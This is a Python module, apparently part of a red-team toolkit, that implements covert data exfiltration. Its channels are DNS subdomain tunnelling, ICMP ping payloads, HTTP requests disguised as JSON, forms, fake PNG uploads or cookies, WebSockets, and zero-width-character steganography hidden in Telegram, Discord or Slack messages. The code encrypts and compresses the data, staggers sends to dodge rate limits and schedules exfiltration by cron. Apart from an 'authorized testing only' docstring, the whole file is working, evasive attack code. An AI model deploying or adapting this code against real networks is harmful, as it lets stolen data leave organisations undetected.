"""
ExfilEngine — Module 23
Data exfiltration via covert channels.

ALL methods are for authorized penetration testing / red team operations only.
Supports: DNS tunneling, ICMP payloads, HTTP disguised, WebSocket, social APIs.

All subprocess calls use asyncio.create_subprocess_exec.
Tools are checked with shutil.which() before invocation.
Data is gzip-compressed and AES-256-CBC-encrypted before transmission.
"""
from __future__ import annotations

import asyncio
import base64
import gzip
import hashlib
import io
import json
import logging
import os
import shutil
import socket
import struct
import time
import uuid
from datetime import datetime
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)

_EXFIL_DATA_DIR = Path("./data/exfil")


def _ensure_dirs() -> None:
    _EXFIL_DATA_DIR.mkdir(parents=True, exist_ok=True)


# ─────────────────────────────────────────────────────────────────────────────
# ExfilEngine
# ─────────────────────────────────────────────────────────────────────────────

class ExfilEngine:
    """
    Data exfiltration via covert channels.
    ALL methods are for authorized testing only.
    """

    # ── Compression & Encryption ──────────────────────────────────────────────

    async def compress_and_encrypt(self, data: bytes, key: str = None) -> bytes:
        """
        Compress with gzip + encrypt with AES-256-CBC.
        Returns encrypted bytes (IV prepended).
        """
        # Compress
        buf = io.BytesIO()
        with gzip.GzipFile(fileobj=buf, mode="wb") as gz:
            gz.write(data)
        compressed = buf.getvalue()

        # Derive 32-byte key
        if key is None:
            key = os.environ.get("EXFIL_KEY", "default-exfil-key-change-in-prod")
        key_bytes = hashlib.sha256(key.encode()).digest()  # 32 bytes for AES-256

        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives import padding as crypto_padding
            from cryptography.hazmat.backends import default_backend

            iv = os.urandom(16)
            padder = crypto_padding.PKCS7(128).padder()
            padded = padder.update(compressed) + padder.finalize()

            cipher = Cipher(
                algorithms.AES(key_bytes),
                modes.CBC(iv),
                backend=default_backend(),
            )
            encryptor = cipher.encryptor()
            ciphertext = encryptor.update(padded) + encryptor.finalize()
            return iv + ciphertext  # IV prepended for receiver

        except ImportError:
            logger.warning("[exfil] cryptography not available; returning compressed only")
            return compressed

    async def split_and_stagger(
        self,
        data: bytes,
        chunk_size: int = 512,
        delay_secs: float = 1.0,
    ) -> list:
        """
        Split data into chunks with staggered timing metadata.
        Returns list of {index, chunk_b64, size, send_at_offset}.
        """
        chunks = []
        total = len(data)
        for i, offset in enumerate(range(0, total, chunk_size)):
            chunk = data[offset : offset + chunk_size]
            chunks.append({
                "index": i,
                "chunk_b64": base64.b64encode(chunk).decode(),
                "size": len(chunk),
                "send_at_offset": i * delay_secs,
            })
        return chunks

    # ── DNS Exfiltration ──────────────────────────────────────────────────────

    async def exfiltrate_dns(
        self,
        data: bytes,
        domain: str,
        dns_server: str = "8.8.8.8",
    ) -> dict:
        """
        Encode data in DNS subdomain queries.
        base32 encode chunks -> query {chunk}.{domain} via UDP.
        Each chunk max 63 chars (DNS label limit).
        """
        _ensure_dirs()
        exfil_id = str(uuid.uuid4())[:12]
        checksum = hashlib.sha256(data).hexdigest()[:16]

        # Base32 encode (avoids non-DNS chars)
        encoded = base64.b32encode(data).decode().rstrip("=").lower()
        # Replace padding-related chars that might confuse DNS
        encoded = encoded.replace("=", "a")

        chunk_size = 55  # 63 - len(".domain.tld") margin
        chunks = [encoded[i : i + chunk_size] for i in range(0, len(encoded), chunk_size)]

        sent = 0
        errors = []

        for idx, chunk in enumerate(chunks):
            fqdn = f"{chunk}.{idx:04x}.{exfil_id}.{domain}"
            try:
                # Non-blocking DNS query via UDP socket
                loop = asyncio.get_event_loop()
                await loop.run_in_executor(None, self._dns_query_udp, fqdn, dns_server)
                sent += 1
            except Exception as exc:
                errors.append(f"chunk {idx}: {str(exc)[:50]}")

            # Small delay to avoid rate limiting
            if idx % 10 == 9:
                await asyncio.sleep(0.1)

        return {
            "exfil_id": exfil_id,
            "channel": "dns",
            "domain": domain,
            "dns_server": dns_server,
            "total_bytes": len(data),
            "chunks_total": len(chunks),
            "chunks_sent": sent,
            "checksum": checksum,
            "errors": errors[:10],
            "timestamp": datetime.utcnow().isoformat(),
        }

    @staticmethod
    def _dns_query_udp(fqdn: str, dns_server: str, port: int = 53) -> None:
        """Send a raw DNS A-record query via UDP (blocking, run in executor)."""
        # Build minimal DNS query packet
        tx_id = os.urandom(2)
        flags = b"\x01\x00"  # standard query, recursion desired
        qdcount = b"\x00\x01"
        ancount = b"\x00\x00"
        nscount = b"\x00\x00"
        arcount = b"\x00\x00"
        header = tx_id + flags + qdcount + ancount + nscount + arcount

        # Encode FQDN as DNS name
        question = b""
        for label in fqdn.rstrip(".").split("."):
            label_bytes = label.encode("ascii")[:63]
            question += struct.pack("B", len(label_bytes)) + label_bytes
        question += b"\x00"  # root
        question += b"\x00\x01"  # QTYPE A
        question += b"\x00\x01"  # QCLASS IN

        packet = header + question

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2.0)
        try:
            sock.sendto(packet, (dns_server, port))
            sock.recv(512)  # consume response
        except (socket.timeout, OSError):
            pass  # We don't care about the response
        finally:
            sock.close()

    # ── ICMP Exfiltration ─────────────────────────────────────────────────────

    async def exfiltrate_icmp(
        self,
        data: bytes,
        target_ip: str,
        chunk_size: int = 1400,
    ) -> dict:
        """
        Hide data in ICMP ping payloads.
        Requires root / CAP_NET_RAW.
        Falls back to using system ping with custom payload via hping3.
        """
        _ensure_dirs()
        exfil_id = str(uuid.uuid4())[:12]
        checksum = hashlib.sha256(data).hexdigest()[:16]
        chunks = [data[i : i + chunk_size] for i in range(0, len(data), chunk_size)]
        sent = 0
        method = "raw_socket"
        errors = []

        # Try hping3 for ICMP with data payload
        hping3 = shutil.which("hping3")
        if hping3:
            for idx, chunk in enumerate(chunks):
                chunk_b64 = base64.b64encode(chunk).decode()
                out_cmd, ok = await _run_cmd(
                    [
                        hping3, "-1",  # ICMP mode
                        "--data", str(len(chunk)),
                        "--sign", chunk_b64[:20],
                        "-c", "1",
                        target_ip,
                    ],
                    timeout=10,
                )
                if ok:
                    sent += 1
                else:
                    errors.append(f"chunk {idx}: hping3 failed")
            method = "hping3"
        else:
            # Try raw socket (requires CAP_NET_RAW)
            loop = asyncio.get_event_loop()
            for idx, chunk in enumerate(chunks):
                try:
                    await loop.run_in_executor(
                        None,
                        self._icmp_raw_send,
                        target_ip,
                        chunk,
                        idx,
                    )
                    sent += 1
                except PermissionError:
                    errors.append(f"chunk {idx}: CAP_NET_RAW required")
                    break
                except Exception as exc:
                    errors.append(f"chunk {idx}: {str(exc)[:50]}")
                await asyncio.sleep(0.05)

        return {
            "exfil_id": exfil_id,
            "channel": "icmp",
            "target_ip": target_ip,
            "total_bytes": len(data),
            "chunks_total": len(chunks),
            "chunks_sent": sent,
            "method": method,
            "checksum": checksum,
            "errors": errors[:10],
            "timestamp": datetime.utcnow().isoformat(),
        }

    @staticmethod
    def _icmp_raw_send(target_ip: str, payload: bytes, seq: int) -> None:
        """Send a single ICMP echo with payload. Blocking; run in executor."""
        ICMP_ECHO = 8
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.settimeout(2.0)
        try:
            # Build ICMP header
            header = struct.pack("bbHHh", ICMP_ECHO, 0, 0, os.getpid() & 0xFFFF, seq)
            # Compute checksum
            data_pkt = header + payload
            chk = ExfilEngine._icmp_checksum(data_pkt)
            header = struct.pack("bbHHh", ICMP_ECHO, 0, chk, os.getpid() & 0xFFFF, seq)
            sock.sendto(header + payload, (target_ip, 0))
        finally:
            sock.close()

    @staticmethod
    def _icmp_checksum(data: bytes) -> int:
        if len(data) % 2:
            data += b"\x00"
        s = 0
        for i in range(0, len(data), 2):
            s += (data[i] << 8) + data[i + 1]
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    # ── HTTP Exfiltration ─────────────────────────────────────────────────────

    async def exfiltrate_http(
        self,
        data: bytes,
        endpoint: str,
        method: str = "POST",
        disguise: str = "json",
    ) -> dict:
        """
        Exfiltrate via HTTP.
        disguise: json | form | base64_img | cookie
        """
        _ensure_dirs()
        exfil_id = str(uuid.uuid4())[:12]
        checksum = hashlib.sha256(data).hexdigest()[:16]
        chunks_sent = 0
        chunk_size = 4096
        chunks = [data[i : i + chunk_size] for i in range(0, len(data), chunk_size)]
        errors = []

        try:
            import aiohttp

            async with aiohttp.ClientSession() as session:
                for idx, chunk in enumerate(chunks):
                    chunk_b64 = base64.b64encode(chunk).decode()

                    if disguise == "json":
                        payload_body = json.dumps({
                            "id": exfil_id,
                            "seq": idx,
                            "data": chunk_b64,
                            "ts": time.time(),
                        })
                        headers = {"Content-Type": "application/json"}
                        req_kwargs = {"data": payload_body, "headers": headers}

                    elif disguise == "form":
                        req_kwargs = {
                            "data": {
                                "q": chunk_b64,
                                "id": exfil_id,
                                "page": str(idx),
                            }
                        }

                    elif disguise == "base64_img":
                        # Disguise as multipart image upload
                        fake_png = base64.b64decode(
                            "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVQI12NgAAIABQAABjE+ibYAAAAASUVORK5CYII="
                        )
                        form = aiohttp.FormData()
                        form.add_field("file", fake_png + chunk, filename="image.png", content_type="image/png")
                        form.add_field("id", exfil_id)
                        req_kwargs = {"data": form}

                    elif disguise == "cookie":
                        headers = {
                            "Cookie": f"session={chunk_b64}; id={exfil_id}; seq={idx}",
                        }
                        req_kwargs = {"headers": headers}

                    else:
                        req_kwargs = {"data": chunk_b64}

                    try:
                        http_method = getattr(session, method.lower(), session.post)
                        async with http_method(endpoint, **req_kwargs, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                            if resp.status < 400:
                                chunks_sent += 1
                            else:
                                errors.append(f"chunk {idx}: HTTP {resp.status}")
                    except Exception as exc:
                        errors.append(f"chunk {idx}: {str(exc)[:50]}")

                    if idx % 5 == 4:
                        await asyncio.sleep(0.2)

        except ImportError:
            # Fallback: use curl
            curl = shutil.which("curl")
            if curl:
                chunk_b64 = base64.b64encode(data).decode()
                out, ok = await _run_cmd(
                    [curl, "-s", "-X", method, endpoint,
                     "-H", "Content-Type: application/json",
                     "-d", json.dumps({"id": exfil_id, "data": chunk_b64})],
                    timeout=30,
                )
                chunks_sent = len(chunks) if ok else 0
                errors = [] if ok else ["curl failed"]
            else:
                errors = ["aiohttp and curl both unavailable"]

        return {
            "exfil_id": exfil_id,
            "channel": "http",
            "endpoint": endpoint,
            "method": method,
            "disguise": disguise,
            "total_bytes": len(data),
            "chunks_total": len(chunks),
            "chunks_sent": chunks_sent,
            "checksum": checksum,
            "errors": errors[:10],
            "timestamp": datetime.utcnow().isoformat(),
        }

    # ── WebSocket Exfiltration ────────────────────────────────────────────────

    async def exfiltrate_websocket(self, data: bytes, ws_url: str) -> dict:
        """Exfiltrate via WebSocket connection."""
        _ensure_dirs()
        exfil_id = str(uuid.uuid4())[:12]
        checksum = hashlib.sha256(data).hexdigest()[:16]
        chunk_size = 4096
        chunks = [data[i : i + chunk_size] for i in range(0, len(data), chunk_size)]
        sent = 0
        errors = []

        try:
            import websockets

            async with websockets.connect(ws_url) as ws:
                # Handshake
                await ws.send(json.dumps({
                    "type": "init",
                    "exfil_id": exfil_id,
                    "total_chunks": len(chunks),
                    "checksum": checksum,
                }))

                for idx, chunk in enumerate(chunks):
                    chunk_b64 = base64.b64encode(chunk).decode()
                    await ws.send(json.dumps({
                        "type": "chunk",
                        "exfil_id": exfil_id,
                        "seq": idx,
                        "data": chunk_b64,
                    }))
                    sent += 1
                    await asyncio.sleep(0.05)

                # EOF marker
                await ws.send(json.dumps({"type": "eof", "exfil_id": exfil_id}))

        except ImportError:
            errors.append("websockets package not installed")
        except Exception as exc:
            errors.append(str(exc)[:100])

        return {
            "exfil_id": exfil_id,
            "channel": "websocket",
            "ws_url": ws_url,
            "total_bytes": len(data),
            "chunks_total": len(chunks),
            "chunks_sent": sent,
            "checksum": checksum,
            "errors": errors,
            "timestamp": datetime.utcnow().isoformat(),
        }

    # ── Social Media Exfiltration ─────────────────────────────────────────────

    async def exfiltrate_social(
        self,
        data: bytes,
        platform: str,
        api_key: str,
        channel: str,
    ) -> dict:
        """
        Exfiltrate via messaging APIs.
        platform: telegram | discord | slack
        Data encoded as zero-width characters (steganographic text).
        """
        _ensure_dirs()
        exfil_id = str(uuid.uuid4())[:12]
        checksum = hashlib.sha256(data).hexdigest()[:16]

        # Encode using zero-width chars: ZWS=0, ZWNJ=1 (binary steganography)
        encoded_msg = self._zwc_encode(data)
        cover_text = f"System update {datetime.utcnow().strftime('%Y-%m-%d')} complete."
        stego_msg = cover_text + encoded_msg

        sent = False
        error = None

        try:
            import aiohttp

            if platform == "telegram":
                url = f"https://api.telegram.org/bot{api_key}/sendMessage"
                async with aiohttp.ClientSession() as sess:
                    async with sess.post(url, json={
                        "chat_id": channel,
                        "text": stego_msg,
                    }, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                        sent = resp.status == 200
                        if not sent:
                            body = await resp.text()
                            error = f"HTTP {resp.status}: {body[:100]}"

            elif platform == "discord":
                url = f"https://discord.com/api/webhooks/{channel}"
                async with aiohttp.ClientSession() as sess:
                    async with sess.post(url, json={
                        "content": stego_msg,
                        "username": "monitor_bot",
                    }, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                        sent = resp.status in (200, 204)
                        if not sent:
                            body = await resp.text()
                            error = f"HTTP {resp.status}: {body[:100]}"

            elif platform == "slack":
                async with aiohttp.ClientSession() as sess:
                    async with sess.post(
                        "https://slack.com/api/chat.postMessage",
                        headers={"Authorization": f"Bearer {api_key}"},
                        json={"channel": channel, "text": stego_msg},
                        timeout=aiohttp.ClientTimeout(total=15),
                    ) as resp:
                        body = await resp.json()
                        sent = body.get("ok", False)
                        if not sent:
                            error = body.get("error", "unknown")
            else:
                error = f"Unsupported platform: {platform}"

        except ImportError:
            error = "aiohttp not installed"
        except Exception as exc:
            error = str(exc)[:100]

        return {
            "exfil_id": exfil_id,
            "channel": "social",
            "platform": platform,
            "total_bytes": len(data),
            "encoding": "zero_width_steganography",
            "sent": sent,
            "checksum": checksum,
            "error": error,
            "timestamp": datetime.utcnow().isoformat(),
        }

    @staticmethod
    def _zwc_encode(data: bytes) -> str:
        """Encode bytes as zero-width characters (ZWS=0, ZWNJ=1)."""
        ZWS = "​"   # zero-width space = 0
        ZWNJ = "‌"  # zero-width non-joiner = 1
        bits = "".join(f"{b:08b}" for b in data)
        return "".join(ZWS if bit == "0" else ZWNJ for bit in bits)

    @staticmethod
    def _zwc_decode(encoded: str) -> bytes:
        """Decode zero-width characters back to bytes."""
        ZWS = "​"
        bits = "".join("0" if ch == ZWS else "1" for ch in encoded if ch in (ZWS, "‌"))
        n = len(bits) // 8
        return bytes(int(bits[i * 8 : (i + 1) * 8], 2) for i in range(n))

    # ── Channel Test ──────────────────────────────────────────────────────────

    async def test_channel(self, channel: str, config: dict) -> dict:
        """Test if exfil channel is functional without sending real data."""
        test_payload = b"AEGIS_EXFIL_TEST_" + os.urandom(8)

        if channel == "dns":
            domain = config.get("domain", "example.com")
            dns_server = config.get("dns_server", "8.8.8.8")
            result = await self.exfiltrate_dns(test_payload, domain, dns_server)
            return {
                "channel": "dns",
                "functional": result["chunks_sent"] > 0,
                "result": result,
            }

        elif channel == "http":
            endpoint = config.get("endpoint", "http://httpbin.org/post")
            result = await self.exfiltrate_http(test_payload, endpoint, disguise="json")
            return {
                "channel": "http",
                "functional": result["chunks_sent"] > 0,
                "result": result,
            }

        elif channel == "icmp":
            target_ip = config.get("target_ip", "127.0.0.1")
            result = await self.exfiltrate_icmp(test_payload, target_ip, chunk_size=64)
            return {
                "channel": "icmp",
                "functional": result["chunks_sent"] > 0,
                "result": result,
            }

        elif channel == "websocket":
            ws_url = config.get("ws_url", "ws://localhost:8080")
            result = await self.exfiltrate_websocket(test_payload, ws_url)
            return {
                "channel": "websocket",
                "functional": result["chunks_sent"] > 0,
                "result": result,
            }

        elif channel in ("telegram", "discord", "slack"):
            api_key = config.get("api_key", "")
            ch = config.get("channel", "")
            result = await self.exfiltrate_social(test_payload, channel, api_key, ch)
            return {
                "channel": channel,
                "functional": result["sent"],
                "result": result,
            }

        else:
            return {"channel": channel, "functional": False, "error": "Unknown channel"}

    # ── Scheduled Exfil ───────────────────────────────────────────────────────

    async def schedule_exfil(
        self,
        data_path: str,
        channel: str,
        cron_expr: str,
        config: dict,
        db=None,
    ) -> str:
        """
        Schedule exfiltration at a specific cron time.
        Stores job in DB and registers with TriggerEngine.
        Returns exfil_id.
        """
        from core.engines.trigger_engine import trigger_engine

        exfil_id = str(uuid.uuid4())

        # Create a trigger with scheduled_time condition
        action_params = {
            "data_path": data_path,
            "channel": channel,
            "exfil_id": exfil_id,
            **config,
        }

        trigger_id = await trigger_engine.create_trigger(
            name=f"exfil_{channel}_{exfil_id[:8]}",
            condition_type="scheduled_time",
            condition={"cron": cron_expr},
            action_type="exfiltrate_data",
            action=action_params,
            enabled=True,
            db=db,
        )

        # Persist ExfilJob to DB
        if db is not None:
            from database.models import ExfilJob
            # Read file to get size
            fpath = Path(data_path)
            data_size = fpath.stat().st_size if fpath.exists() else 0
            job = ExfilJob(
                exfil_id=exfil_id,
                channel=channel,
                status="pending",
                data_size=data_size,
                encrypted=config.get("encrypt", False),
                compressed=config.get("compress", False),
                scheduled_at=datetime.utcnow(),
            )
            db.add(job)
            db.commit()

        logger.info(
            "[exfil] Scheduled %s exfil job %s via trigger %s cron=%s",
            channel, exfil_id, trigger_id, cron_expr,
        )
        return exfil_id

    # ── Job status (DB helpers) ───────────────────────────────────────────────

    async def list_jobs(self, db) -> list:
        from database.models import ExfilJob
        rows = db.query(ExfilJob).order_by(ExfilJob.created_at.desc()).all()
        return [
            {
                "exfil_id": r.exfil_id,
                "channel": r.channel,
                "status": r.status,
                "data_size": r.data_size,
                "chunks_total": r.chunks_total,
                "chunks_sent": r.chunks_sent,
                "encrypted": r.encrypted,
                "compressed": r.compressed,
                "checksum": r.checksum,
                "error_msg": r.error_msg,
                "scheduled_at": r.scheduled_at.isoformat() if r.scheduled_at else None,
                "started_at": r.started_at.isoformat() if r.started_at else None,
                "completed_at": r.completed_at.isoformat() if r.completed_at else None,
                "created_at": r.created_at.isoformat() if r.created_at else None,
            }
            for r in rows
        ]

    async def get_job(self, exfil_id: str, db) -> Optional[dict]:
        from database.models import ExfilJob
        row = db.query(ExfilJob).filter(ExfilJob.exfil_id == exfil_id).first()
        if not row:
            return None
        return {
            "exfil_id": row.exfil_id,
            "channel": row.channel,
            "status": row.status,
            "data_size": row.data_size,
            "chunks_total": row.chunks_total,
            "chunks_sent": row.chunks_sent,
            "encrypted": row.encrypted,
            "compressed": row.compressed,
            "checksum": row.checksum,
            "error_msg": row.error_msg,
            "scheduled_at": row.scheduled_at.isoformat() if row.scheduled_at else None,
            "started_at": row.started_at.isoformat() if row.started_at else None,
            "completed_at": row.completed_at.isoformat() if row.completed_at else None,
        }

    async def _persist_job(
        self, result: dict, channel: str, data_size: int, db=None
    ) -> None:
        """Persist an exfil result to the DB."""
        if db is None:
            return
        from database.models import ExfilJob
        job = ExfilJob(
            exfil_id=result.get("exfil_id", str(uuid.uuid4())),
            channel=channel,
            status="completed" if result.get("chunks_sent", 0) > 0 else "failed",
            data_size=data_size,
            chunks_total=result.get("chunks_total", 0),
            chunks_sent=result.get("chunks_sent", 0),
            encrypted=False,
            compressed=False,
            checksum=result.get("checksum"),
            started_at=datetime.utcnow(),
            completed_at=datetime.utcnow(),
            error_msg=json.dumps(result.get("errors", []))[:500] if result.get("errors") else None,
        )
        db.add(job)
        db.commit()


# ─────────────────────────────────────────────────────────────────────────────
# Shared subprocess helper
# ─────────────────────────────────────────────────────────────────────────────

async def _run_cmd(cmd: list[str], timeout: int = 60) -> tuple[str, bool]:
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        try:
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return stdout.decode("utf-8", errors="replace").strip(), proc.returncode == 0
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()
            return f"[TIMEOUT] {cmd[0]}", False
    except FileNotFoundError:
        return f"[NOT_FOUND] {cmd[0]}", False
    except Exception as exc:
        return str(exc), False
